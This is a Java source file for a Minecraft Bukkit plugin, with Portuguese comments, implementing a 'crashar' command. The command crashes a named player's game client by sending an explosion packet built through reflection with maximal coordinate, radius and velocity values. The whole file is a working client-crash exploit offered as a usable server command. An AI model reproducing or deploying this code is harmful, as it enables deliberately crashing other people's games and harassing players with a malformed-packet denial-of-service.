package rush.comandos;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Collections;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import rush.configuracoes.Mensagens;
import rush.utils.ReflectionUtils;

@SuppressWarnings("all")
public class ComandoCrashar implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender s, Command cmd, String lbl, String[] args) {
		if (cmd.getName().equalsIgnoreCase("crashar")) {
		
			// Verificando se o player digitou o número de argumentos corretos
			if (args.length != 1) {
				s.sendMessage(Mensagens.Crashar_Comando_Incorreto);
				return true;
			}
			
			// Pegando o player e verificando se ele esta online
			Player p = Bukkit.getPlayer(args[0]);
			if (p == null) {
				s.sendMessage(Mensagens.Player_Offline);
				return true;
			}
			
			// Chamando o metodo que crasha o player e enviando a mensagem.
			crashPlayer(p);
			s.sendMessage(Mensagens.Crashado_Com_Sucesso.replace("%player%", p.getName()).replace('&', '§'));
			return true;
		}
		return false;
	}
	
	// Método que crasha o minecraft do player.
	private void crashPlayer(Player player) {
		try {
			Class<?> PacketPlayOutExplosionClass = ReflectionUtils.getNMSClass("PacketPlayOutExplosion");
			Class<?> Vector3dClass = ReflectionUtils.getNMSClass("Vec3D");
			Constructor<?> PacketPlayOutExplosionConstructor = PacketPlayOutExplosionClass.getConstructor(double.class, double.class, double.class, float.class, List.class, Vector3dClass);
		    Constructor<?> Vector3dConstructor = Vector3dClass.getConstructor(double.class, double.class, double.class);
		    Object Vec3D = Vector3dConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
		    Object packet = PacketPlayOutExplosionConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), Vec3D);
		    ReflectionUtils.sendPacket(player, packet);
		} catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException | InstantiationException e) {
			e.printStackTrace();
		}
	}
}